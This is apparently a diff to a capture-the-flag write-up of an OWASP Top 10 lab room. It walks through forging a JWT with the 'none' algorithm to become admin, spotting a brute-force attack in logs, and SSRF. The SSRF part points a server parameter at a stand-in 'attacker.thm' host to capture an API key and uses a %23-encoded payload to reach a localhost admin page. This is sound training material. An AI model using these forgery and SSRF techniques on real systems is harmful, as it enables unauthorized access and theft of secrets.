@@ -417,7 +417,7 @@ Navigate to `http://10.10.202.133:8089/` and follow the instructions in the ques
 
 **Try logging into the application as guest. What is guest's account password?**
 
-
+![Desktop View](/assets/img/OWASP/44.png){: width="700" height="400" }
 
 ---
 
@@ -435,10 +435,172 @@ Depending on your browser, you will be able to edit cookies from the following t
 
 **What is the name of the website's cookie containing a JWT token?**
 
-
+![Desktop View](/assets/img/OWASP/45.png){: width="700" height="400" }
 
 **Use the knowledge gained in this task to modify the JWT token so that the application thinks you are the user "admin".**
 
+Open a word document. Copy the “Value” and paste the entire code to the document. It should look like this:
+
+`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjg2MzIxNjI2fQ.L159cLhW34u6BYodwGSJwHftLw34J-zKQF9Xo1uYBVA`
+
+Next, you need to use the head and payload. If you recall from the task the header is up to the “.”, then the payload is up to the next “.”, don’t worry the signature we won’t need it.
+
+Go to `https://appdevtools.com/base64-encoder-decoder` and DECODE the header and payload separately.
+
+
+Copy and paste the decoded information and change the “HS256” to “none” in the header, then change “guest” to “admin”. Now its time to encode this information. Take the result of the two codes and combine them. It should look like this:
+
+![Desktop View](/assets/img/OWASP/46.png){: width="700" height="400" }
+
+![Desktop View](/assets/img/OWASP/47.png){: width="700" height="400" }
+
+![Desktop View](/assets/img/OWASP/48.png){: width="700" height="400" }
+
+![Desktop View](/assets/img/OWASP/49.png){: width="700" height="400" }
+
+Copy and paste the pair into the value of the cookie.
+
+
+Once you insert the code into the cookie, refresh the page to get the flag.
 
 
 **What is the flag presented to the admin user?**
+
+![Desktop View](/assets/img/OWASP/50.png){: width="700" height="400" }
+
+---
+
+## 9. Security Logging and Monitoring Failures
+
+When web applications are set up, every action performed by the user should be logged. Logging is important because, in the event of an incident, the attackers' activities can be traced. Once their actions are traced, their risk and impact can be determined. Without logging, there would be no way to tell what actions were performed by an attacker if they gain access to particular web applications. The more significant impacts of these include:
+
+- **Regulatory damage:** if an attacker has gained access to personally identifiable user information and there is no record of this, final users are affected, and the application owners may be subject to fines or more severe actions depending on regulations.
+
+- **Risk of further attacks:** an attacker's presence may be undetected without logging. This could allow an attacker to launch further attacks against web application owners by stealing credentials, attacking infrastructure and more.
+
+The information stored in logs should include the following:
+
+- HTTP status codes
+
+- Time Stamps
+
+- Usernames
+
+- API endpoints/page locations
+
+- IP addresses
+
+These logs have some sensitive information, so it's important to ensure that they are stored securely and that multiple copies of these logs are stored at different locations.
+
+As you may have noticed, logging is more important after a breach or incident has occurred. The ideal case is to have monitoring in place to detect any suspicious activity. The aim of detecting this suspicious activity is to either stop the attacker completely or reduce the impact they've made if their presence has been detected much later than anticipated. Common examples of suspicious activity include:
+
+- Multiple unauthorised attempts for a particular action (usually authentication attempts or access to unauthorised resources, e.g. admin pages)
+
+- Requests from anomalous IP addresses or locations: while this can indicate that someone else is trying to access a particular user's account, it can also have a false positive rate.
+
+- Use of automated tools: particular automated tooling can be easily identifiable, e.g. using the value of User-Agent headers or the speed of requests. This can indicate that an attacker is using automated tooling.
+
+- Common payloads: in web applications, it's common for attackers to use known payloads. Detecting the use of these payloads can indicate the presence of someone conducting unauthorised/malicious testing on applications.
+
+Just detecting suspicious activity isn't helpful. This suspicious activity needs to be rated according to the impact level. For example, certain actions will have a higher impact than others. These higher-impact actions need to be responded to sooner; thus, they should raise alarms to get the relevant parties' attention.
+
+## Challenge
+
+Put this knowledge to practice by analysing the provided sample log file. You can download it by clicking the Download Task Files button at the top of the task.
+
+![Desktop View](/assets/img/OWASP/51.png){: width="700" height="400" }
+
+**What IP address is the attacker using?**
+
+Notice the IP address that reoccurs in the span of 15 seconds? That is the attack and the IP address is the answer to the first question. The next thing to notice is the different attempts. Same IP address, different login names, in 15 seconds. This is the key to question two. It is a “Brute Force” attack.
+
+**Answer: 49.99.13.16**
+
+**What kind of attack is being carried out?**
+
+**Brute Force**
+
+---
+
+## Server-Side Request Forgery
+
+This type of vulnerability occurs when an attacker can coerce a web application into sending requests on their behalf to arbitrary destinations while having control of the contents of the request itself. SSRF vulnerabilities often arise from implementations where our web application needs to use third-party services.
+
+Think, for example, of a web application that uses an external API to send SMS notifications to its clients. For each email, the website needs to make a web request to the SMS provider's server to send the content of the message to be sent. Since the SMS provider charges per message, they require you to add a secret key, which they pre-assign to you, to each request you make to their API. The API key serves as an authentication token and allows the provider to know to whom to bill each message. The application would work like this:
+
+![Desktop View](/assets/img/OWASP/52.png){: width="700" height="400" }
+
+By looking at the diagram above, it is easy to see where the vulnerability lies. The application exposes the server parameter to the users, which defines the server name of the SMS service provider. If the attacker wanted, they could simply change the value of the server to point to a machine they control, and your web application would happily forward the SMS request to the attacker instead of the SMS provider. As part of the forwarded message, the attacker would obtain the API key, allowing them to use the SMS service to send messages at your expense. To achieve this, the attacker would only need to make the following request to your website:
+
+`https://www.mysite.com/sms?server=attacker.thm&msg=ABC`
+
+This would make the vulnerable web application make a request to:
+
+`https://attacker.thm/api/send?msg=ABC `
+
+You could then just capture the contents of the request using Netcat:
+
+```bash
+user@attackbox$ nc -lvp 80
+Listening on 0.0.0.0 80
+Connection received on 10.10.1.236 43830
+GET /:8087/public-docs/123.pdf HTTP/1.1
+Host: 10.10.10.11
+User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
+Accept: */*
+```
+
+This is a really basic case of SSRF. If this doesn't look that scary, SSRF can actually be used to do much more. In general, depending on the specifics of each scenario, SSRF can be used for:
+
+- Enumerate internal networks, including IP addresses and ports.
+
+- Abuse trust relationships between servers and gain access to otherwise restricted services.
+
+- Interact with some non-HTTP services to get remote code execution (RCE).
+
+Let's quickly look at how we can use SSRF to abuse some trust relationships.
+
+### Challenge
+
+Navigate to `http://10.10.136.154:8087/`, where you'll find a simple web application. After exploring a bit, you should see an admin area, which will be our main objective. Follow the instructions on the following questions to gain access to the website's restricted area!
+
+**Explore the website. What is the only host allowed to access the admin area?**
+
+![Desktop View](/assets/img/OWASP/53.png){: width="700" height="400" }
+
+![Desktop View](/assets/img/OWASP/54.png){: width="700" height="400" }
+
+**Check the "Download Resume" button. Where does the server parameter point to?**
+
+![Desktop View](/assets/img/OWASP/55.png){: width="700" height="400" }
+
+**Using SSRF, make the application send the request to your AttackBox instead of the secure file storage. Are there any API keys in the intercepted request?**
+
+![Desktop View](/assets/img/OWASP/56.png){: width="700" height="400" }
+
+![Desktop View](/assets/img/OWASP/57.png){: width="700" height="400" }
+
+![Desktop View](/assets/img/OWASP/58.png){: width="700" height="400" }
+
+#### Going the Extra Mile: There's a way to use SSRF to gain access to the site's admin area. Can you find it?
+
+We already know from the first question that only “localhost” has access to the area. So we are going to change the server to the localhost and admin by using:
+
+`http://localhost:8087/admin`
+
+(Trying `?server=http://localhost:8087` confirms that SSRF is possible)
+
+However when adding /admin it breaks. Because it still has &id=123 and adding the /admin makes it an invaild request and fails.
+
+If you drop the id=75482342 the link will not work.
+
+So the fix for this is similar to a SQL injection and to break up the server and id in the link (obfuscation). Some forums called it “escaping the # (hash)”.
+
+Instead of just using a url fragment like # we can obfuscate it because # normally isn't sent in HTTP requests we can encode it with `%23`. 
+
+Turning our full url into `http://10.10.190.86:8087/download?server=http://localhost:8087/admin%23&id=75482342`.
+
+Which will then give access to the flag.
+
+![Desktop View](/assets/img/OWASP/59.png){: width="700" height="400" }
+
